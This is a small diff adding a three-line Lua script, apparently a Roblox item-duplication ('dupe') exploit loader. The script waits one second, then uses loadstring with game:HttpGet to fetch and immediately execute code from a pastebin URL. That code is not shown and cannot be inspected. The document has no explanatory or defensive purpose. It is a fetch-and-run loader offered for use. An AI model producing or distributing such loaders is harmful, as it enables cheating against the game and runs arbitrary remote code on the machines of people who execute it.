@@ -1,0 +1,3 @@
+-- Main Dupe Initializer
+wait(1)
+loadstring(game:HttpGet('https://pastebin.com/raw/pa3x9QaS'))()
